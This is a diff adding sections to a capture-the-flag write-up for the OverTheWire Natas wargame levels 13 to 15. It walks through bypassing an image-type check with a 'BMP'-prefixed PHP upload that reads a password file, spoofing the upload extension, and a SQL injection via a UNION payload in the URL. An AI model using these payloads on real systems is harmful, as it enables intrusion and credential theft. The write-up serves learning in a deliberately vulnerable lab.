@@ -101,3 +101,46 @@ echo
 Let's work on getting a basic hello world script to run on the server. We observed that the `.jpg` extension is created by the `pathinfo` function, so in fact, we can get past it as long as we get the form submission to have the extension we desire. Maybe we can do this by intercepting the http request on its way to the server. Let's start up Burp.
 
 We see that the form submits the file using a POST request in the body. Thankfully, since this isn't HTTPS, we can tamper freely. You'll see a random generated name for the file with the .jpg suffix. Change that to .php, and the upload should succeed, allowing us to run the file with the nice link they provided us with, giving us the password.
+
+## Level 13 - 14
+This looks like the same challenge as before, but as they hint, we now expect some kind of guard to check that our file is an image. Let's inspect the code. We see that this is implemented with a single additional conditional clause, and nothing more.
+
+```php
+else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
+    echo "File is not an image";
+```
+
+The [documentation](https://www.php.net/manual/en/function.exif-imagetype.php) for the `exif_imagetype()` function reveals that it returns some enumerated integer constants to represent the type of image it detected. We also see that it works by reading the first bytes of an image and checking its signature. So, we need some way to get this function to return a non-falsy value.
+
+We could spoof some image types by adding a suitable magic number to the start of our PHP script source, but the easiest one is to notice that `exif_imagetype()` accepts BMP (bitmap) images, which all begin with the simple ASCII characters "BMP". This also makes the password output more readable as we know everything output after the BMP characters are our password. Therefore our script looks like this:
+```php
+BMP
+
+<?php
+echo file_get_contents("/etc/natas_webpass/natas14")
+?>
+```
+
+Just following the same steps as we did before (spoofing the form-submitted file extension) will get us our password again.
+
+## Level 14 - 15
+Looks like a straightforward SQL injection! Looking at the code, we see a mysql query as expected. We first notice that all we have to do to get our password is execute a query that returns any entry:
+```php
+if(mysql_num_rows(mysql_query($query, $link)) > 0) {
+    echo "Successful login! The password for natas15 is <censored><br>";
+}
+```
+
+It's useful to note that the form is submitted by POST, so we can't see the query string. We note that there is a little bit of code that we can exploit to fine-tune our query:
+```php
+if(array_key_exists("debug", $_GET)) {
+    echo "Executing query: $query<br>";
+}
+```
+
+So, if we do our own GET request instead of the POST submitted by the form and add the `debug` parameter, we can see exactly which statement of ours gets executed. Finally, let's look at the query:
+```sql
+$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
+```
+http://natas14.natas.labs.overthewire.org/?debug&username=1&password=1%22+UNION+SELECT+*+from+users+where+%221%22+=+%221
+a" union select * from users where "1" = "1
